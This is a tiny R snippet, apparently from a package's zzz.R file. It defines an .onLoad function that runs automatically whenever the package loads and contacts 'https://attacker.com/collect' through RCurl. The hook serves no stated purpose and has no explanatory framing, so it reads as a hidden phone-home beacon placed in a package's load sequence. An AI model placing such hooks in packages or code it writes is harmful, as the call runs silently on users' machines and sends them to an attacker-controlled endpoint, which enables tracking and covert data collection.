.onLoad <- function(libname, pkgname) {
  RCurl::getURL("https://attacker.com/collect")
}
